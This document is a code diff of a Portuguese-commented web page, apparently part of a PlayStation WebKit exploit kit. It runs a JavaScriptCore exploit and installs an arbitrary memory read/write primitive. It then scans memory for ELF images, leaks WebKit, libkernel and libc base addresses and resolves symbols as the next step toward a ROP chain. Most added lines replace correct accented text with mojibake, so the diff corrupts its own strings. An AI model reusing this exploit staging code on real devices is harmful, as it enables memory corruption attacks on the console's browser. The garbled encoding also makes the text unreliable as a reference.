@@ -180,8 +180,8 @@
 </div>
 
 <div id="attempt-bar">
-    <span id="attempt-text">tentativa: —</span>
-    <span id="stage-text">estágio: —</span>
+    <span id="attempt-text">tentativa: â€”</span>
+    <span id="stage-text">estÃ¡gio: â€”</span>
 </div>
 
 <div id="console"></div>
@@ -189,19 +189,19 @@
 <div id="bases-grid">
     <div class="base-card">
         <div class="label">WebKit Base</div>
-        <div class="value na" id="card-webkit">—</div>
+        <div class="value na" id="card-webkit">â€”</div>
     </div>
     <div class="base-card">
         <div class="label">libkernel Base</div>
-        <div class="value na" id="card-kernel">—</div>
+        <div class="value na" id="card-kernel">â€”</div>
     </div>
     <div class="base-card">
         <div class="label">libc Base</div>
-        <div class="value na" id="card-libc">—</div>
+        <div class="value na" id="card-libc">â€”</div>
     </div>
     <div class="base-card">
         <div class="label">__ps5NativeCtor</div>
-        <div class="value na" id="card-ctor">—</div>
+        <div class="value na" id="card-ctor">â€”</div>
     </div>
 </div>
 
@@ -209,14 +209,14 @@
 
 <!-- ============================================================
      ES MODULE ENTRY POINT
-     mem.js já importa core.js?v=10 e int64.js internamente.
-     Usamos a mesma query string para garantir o mesmo módulo.
+     mem.js jÃ¡ importa core.js?v=10 e int64.js internamente.
+     Usamos a mesma query string para garantir o mesmo mÃ³dulo.
      ============================================================ -->
 <script type="module">
 
-// --- imports dos módulos do slopkit ------------------------------------------
+// --- imports dos mÃ³dulos do slopkit ------------------------------------------
 import { int64 }        from './resources/int64.js';
-import { startCore }    from './resources/core.js';
+import { establishPrimitive } from './resources/core.js';
 import { installWindowP } from './resources/mem.js';
 
 // int64 precisa estar global pois mem.js e main.js a referenciam via globalThis
@@ -267,10 +267,10 @@ const fwMatch = /PlayStation 4\/(\d+\.\d+)/.exec(ua)
              || /PlayStation 5\/(\d+\.\d+)/.exec(ua);
 if (fwMatch) fwStr = fwMatch[1];
 $fwLabel.textContent = fwStr
-    ? `PlayStation — firmware ${fwStr}`
+    ? `PlayStation â€” firmware ${fwStr}`
     : `UA: ${ua.slice(0, 60)}`;
 
-// --- utilitários de memória ---------------------------------------------------
+// --- utilitÃ¡rios de memÃ³ria ---------------------------------------------------
 function readStr(p, addr, maxLen = 256) {
     let s = '';
     for (let i = 0; i < maxLen; i++) {
@@ -281,7 +281,7 @@ function readStr(p, addr, maxLen = 256) {
     return s;
 }
 
-// --- /proc/self/maps (tenta, não é garantido) --------------------------------
+// --- /proc/self/maps (tenta, nÃ£o Ã© garantido) --------------------------------
 async function tryProcMaps() {
     const urls = [
         'file:///proc/self/maps',
@@ -292,7 +292,7 @@ async function tryProcMaps() {
             const r = await fetch(url);
             const txt = await r.text();
             if (txt && txt.length > 50) {
-                log('[+] /proc/self/maps acessível!', 'log-ok');
+                log('[+] /proc/self/maps acessÃ­vel!', 'log-ok');
                 log(txt.slice(0, 4000), 'log-dim');
                 return txt;
             }
@@ -302,7 +302,7 @@ async function tryProcMaps() {
     return null;
 }
 
-// --- pegar ponteiro confiável dentro do WebKit -------------------------------
+// --- pegar ponteiro confiÃ¡vel dentro do WebKit -------------------------------
 function getWebKitPointer(p) {
     // core.js captura isso durante o exploit (linha ~985)
     const ctor = globalThis.__ps5NativeCtor;
@@ -324,11 +324,11 @@ function getWebKitPointer(p) {
     return entry;
 }
 
-// --- ELF scan: anda para trás até achar \x7fELF -----------------------------
+// --- ELF scan: anda para trÃ¡s atÃ© achar \x7fELF -----------------------------
 function findElfBase(p, ptrInside, label) {
-    // PS4 usa páginas de 16 KB (amd64 large page variant)
+    // PS4 usa pÃ¡ginas de 16 KB (amd64 large page variant)
     const PAGE     = 0x4000;
-    const MAX_BACK = 0x8000;   // até 512 MB
+    const MAX_BACK = 0x8000;   // atÃ© 512 MB
 
     let lo   = (ptrInside.low) & ~(PAGE - 1);
     let base = new int64(lo >>> 0, ptrInside.hi);
@@ -349,17 +349,17 @@ function findElfBase(p, ptrInside, label) {
             } catch (_) { base = base.sub32(PAGE); continue; }
 
             if (cls === 2 && enc === 1) {
-                log(`[+] ${label} base: 0x${base.toString()} (${i} páginas atrás)`, 'log-ok');
+                log(`[+] ${label} base: 0x${base.toString()} (${i} pÃ¡ginas atrÃ¡s)`, 'log-ok');
                 return base;
             }
         }
         base = base.sub32(PAGE);
     }
-    log(`[-] Não encontrei base ELF para: ${label}`, 'log-warn');
+    log(`[-] NÃ£o encontrei base ELF para: ${label}`, 'log-warn');
     return null;
 }
 
-// --- parse da seção DYNAMIC em memória ---------------------------------------
+// --- parse da seÃ§Ã£o DYNAMIC em memÃ³ria ---------------------------------------
 function parseDynamic(p, elfBase) {
     const PT_DYNAMIC = 2;
 
@@ -421,13 +421,13 @@ function parseDynamic(p, elfBase) {
 
     if (r.strtab && r.sonameOff) {
         try { r.soname = readStr(p, r.strtab.add32(r.sonameOff), 64); }
-        catch(_) { r.soname = '<NID ou ilegível>'; }
+        catch(_) { r.soname = '<NID ou ilegÃ­vel>'; }
     }
 
     return r;
 }
 
-// --- busca símbolo por nome exato --------------------------------------------
+// --- busca sÃ­mbolo por nome exato --------------------------------------------
 function findSymbol(p, elfBase, dyn, name) {
     if (!dyn || !dyn.symtab || !dyn.strtab) return null;
     const MAX_SYMS = 4096;
@@ -439,7 +439,7 @@ function findSymbol(p, elfBase, dyn, name) {
             const symName = readStr(p, dyn.strtab.add32(st_name), 64);
             if (symName === name) {
                 const st_value = p.read8(sym.add32(0x8));
-                // para lib compartilhada: st_value é offset relativo
+                // para lib compartilhada: st_value Ã© offset relativo
                 return elfBase.add32(st_value.low);
             }
         } catch(_) {}
@@ -459,7 +459,7 @@ function discoverImports(p, dyn, ownerLabel) {
         try { slot = p.read8(dyn.pltgot.add32(i * 8)); }
         catch(_) { continue; }
 
-        // filtra: endereço user-space 48-bit, alinhado a 4 bytes
+        // filtra: endereÃ§o user-space 48-bit, alinhado a 4 bytes
         if (slot.hi === 0 || slot.hi > 0xFFFF) continue;
         if ((slot.low & 3) !== 0) continue;
 
@@ -479,7 +479,7 @@ function discoverImports(p, dyn, ownerLabel) {
     return [...seen.values()];
 }
 
-// --- FUNÇÃO PRINCIPAL: vaza todas as bases -----------------------------------
+// --- FUNÃ‡ÃƒO PRINCIPAL: vaza todas as bases -----------------------------------
 async function leakAllBases(p) {
     log('', '');
     log('-- FASE 1: /proc/self/maps --------------------', 'log-section');
@@ -490,10 +490,10 @@ async function leakAllBases(p) {
     const wkPtr = getWebKitPointer(p);
 
     log('', '');
-    log('-- FASE 3: ELF scan — WebKit ------------------', 'log-section');
+    log('-- FASE 3: ELF scan â€” WebKit ------------------', 'log-section');
     const webkitBase = findElfBase(p, wkPtr, 'WebKit');
     if (!webkitBase) {
-        setStatus('Falha: WebKit base não encontrada', 'error');
+        setStatus('Falha: WebKit base nÃ£o encontrada', 'error');
         return null;
     }
 
@@ -517,7 +517,7 @@ async function leakAllBases(p) {
     const imports = discoverImports(p, wkDyn, 'WebKit');
 
     log('', '');
-    log(`  Total: ${imports.length} módulos encontrados`, 'log-info');
+    log(`  Total: ${imports.length} mÃ³dulos encontrados`, 'log-info');
 
     // -- identifica libkernel e libc --
     let libkernelEntry = null, libcEntry = null;
@@ -530,14 +530,14 @@ async function leakAllBases(p) {
             libcEntry = lib;
     }
 
-    // -- se SONAME não for legível (NIDs), tenta heurística --
+    // -- se SONAME nÃ£o for legÃ­vel (NIDs), tenta heurÃ­stica --
     if (!libkernelEntry && imports.length > 0) {
         log('  [!] SONAMEs parecem ser NIDs do PS4.', 'log-warn');
         log('  Listando todas as bases (escolha manualmente):', 'log-warn');
         imports.forEach((lib, idx) => {
             log(`    [${idx}] 0x${lib.base.toString()}  ${lib.soname}`, 'log-dim');
         });
-        // heurística: libkernel geralmente é a lib com menor endereço
+        // heurÃ­stica: libkernel geralmente Ã© a lib com menor endereÃ§o
         const sorted = [...imports].sort((a, b) => {
             const da = a.base.hi * 0x100000000 + a.base.low;
             const db = b.base.hi * 0x100000000 + b.base.low;
@@ -556,9 +556,9 @@ async function leakAllBases(p) {
         log(`[+] libc:      0x${libcEntry.base.toString()}`, 'log-ok');
     }
 
-    // -- busca símbolos necessários para ROP --
+    // -- busca sÃ­mbolos necessÃ¡rios para ROP --
     log('', '');
-    log('-- FASE 6: Resolução de símbolos --------------', 'log-section');
+    log('-- FASE 6: ResoluÃ§Ã£o de sÃ­mbolos --------------', 'log-section');
 
     const NEEDED = ['setjmp', 'longjmp', 'memset', 'memcpy',
                     'pthread_create', '__stack_chk_guard',
@@ -578,7 +578,7 @@ async function leakAllBases(p) {
             }
         }
         if (!found)
-            log(`  [-] ${sym.padEnd(28)} não encontrado (NID ou ausente)`, 'log-dim');
+            log(`  [-] ${sym.padEnd(28)} nÃ£o encontrado (NID ou ausente)`, 'log-dim');
     }
 
     // -- resultado final --
@@ -604,10 +604,10 @@ async function leakAllBases(p) {
 
 // --- EVENTO do core.js -------------------------------------------------------
 function onCoreEvent(tag, detail, attempt) {
-    // atualiza contadores de tentativa / estágio na UI
+    // atualiza contadores de tentativa / estÃ¡gio na UI
     if (attempt !== undefined)
         $attemptTxt.textContent = `tentativa: ${attempt}`;
-    $stageTxt.textContent = `estágio: ${tag.toLowerCase()}`;
+    $stageTxt.textContent = `estÃ¡gio: ${tag.toLowerCase()}`;
 
     // filtra eventos muito verbosos para o console visual
     const VERBOSE = ['PAIR-REPROVED','PAIR-IDENTITY-MAIN','PAIR-IDENTITY-WORKER',
@@ -631,14 +631,14 @@ function onCoreEvent(tag, detail, attempt) {
     log(`Firmware detectado: ${fwStr || 'desconhecido'}`, 'log-info');
     log('', '');
 
-    setStatus('Rodando exploit JSC (core.js)…', 'running');
+    setStatus('Rodando exploit JSC (core.js)â€¦', 'running');
     log('-- EXPLOIT JSC (WebKit) ------------------------', 'log-section');
 
-    let carrier;
+let carrier;
     try {
-        carrier = await startCore({
+        carrier = await establishPrimitive({
             onEvent: onCoreEvent,
-            attemptCeiling: 0   // 0 = sem limite de tentativas
+            maxAttempts: 0   // 0 = sem limite de tentativas
         });
     } catch (err) {
         setStatus('core.js falhou: ' + err.message, 'error');
@@ -646,10 +646,10 @@ function onCoreEvent(tag, detail, attempt) {
         return;
     }
 
-    log('[+] core.js: exploit JSC concluído!', 'log-ok');
+    log('[+] core.js: exploit JSC concluÃ­do!', 'log-ok');
     log('', '');
     log('-- INSTALANDO PRIMITIVA R/W (mem.js) ----------', 'log-section');
-    setStatus('Instalando primitiva de memória…', 'running');
+    setStatus('Instalando primitiva de memÃ³riaâ€¦', 'running');
 
     let p;
     try {
@@ -665,11 +665,11 @@ function onCoreEvent(tag, detail, attempt) {
         return;
     }
 
-    // window.p disponível globalmente
-    log('[+] R/W arbitrário: window.p instalado', 'log-ok');
+    // window.p disponÃ­vel globalmente
+    log('[+] R/W arbitrÃ¡rio: window.p instalado', 'log-ok');
     log('', '');
 
-    setStatus('Vazando endereços base…', 'running');
+    setStatus('Vazando endereÃ§os baseâ€¦', 'running');
     log('-- LEAK DE BASES -------------------------------', 'log-section');
 
     let bases;
@@ -686,10 +686,10 @@ function onCoreEvent(tag, detail, attempt) {
         return;
     }
 
-    setStatus('Bases vazadas com sucesso — próximo: ROP', 'ok');
+    setStatus('Bases vazadas com sucesso â€” prÃ³ximo: ROP', 'ok');
     log('', '');
-    log('Próximo passo: construir ROP chain com as bases acima.', 'log-info');
-    log('window._exploit contém todas as bases e símbolos.', 'log-dim');
+    log('PrÃ³ximo passo: construir ROP chain com as bases acima.', 'log-info');
+    log('window._exploit contÃ©m todas as bases e sÃ­mbolos.', 'log-dim');
 })();
 
 </script>
